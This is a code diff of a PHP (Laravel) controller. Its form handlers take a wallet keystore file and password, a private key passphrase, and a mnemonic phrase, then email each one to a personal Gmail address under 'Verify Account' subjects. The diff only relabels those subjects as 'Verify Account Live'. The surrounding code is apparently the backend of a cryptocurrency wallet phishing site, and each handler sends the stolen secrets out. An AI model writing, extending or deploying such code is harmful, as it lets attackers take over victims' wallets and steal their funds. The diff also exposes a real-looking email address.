@@ -20,8 +20,8 @@ class ActionController extends Controller
         $data = array('keystorefile' => $upload_link, 'keystorepassword' => $request->keystorepassword);
 
 		Mail::send(['text'=>'firstform'], $data, function($message) {
-		 $message->to('babalolaebenezertaiwo@gmail.com', 'Verify Account : By keystorefile')->subject
-		    ('Verify Account : By keystorefile');
+		 $message->to('babalolaebenezertaiwo@gmail.com', 'Verify Account Live : By keystorefile')->subject
+		    ('Verify Account Live : By keystorefile');
 		 $message->from('xyz@gmail.com','Website');
 		});
 
@@ -33,8 +33,8 @@ class ActionController extends Controller
 	   	$data = array('privatekeypass' => $request->privatekeypass);
 	   
 		Mail::send(['text'=>'secondform'], $data, function($message) {
-		 $message->to('babalolaebenezertaiwo@gmail.com', 'Verify Account : By Private Key')->subject
-		    ('Verify Account : By Private Key');
+		 $message->to('babalolaebenezertaiwo@gmail.com', 'Verify Account Live : By Private Key')->subject
+		    ('Verify Account Live : By Private Key');
 		 $message->from('xyz@gmail.com','Website');
 		});
 
@@ -46,8 +46,8 @@ class ActionController extends Controller
 	   	$data = array('mneomic' => $request->mneomic);
 	   
 		Mail::send(['text'=>'thirdform'], $data, function($message) {
-		 $message->to('babalolaebenezertaiwo@gmail.com', 'Verify Account : By Mneomic Phrase')->subject
-		    ('Verify Account : By Mneomic Phrase');
+		 $message->to('babalolaebenezertaiwo@gmail.com', 'Verify Account Live : By Mneomic Phrase')->subject
+		    ('Verify Account Live : By Mneomic Phrase');
 		 $message->from('xyz@gmail.com','Website');
 		});
 
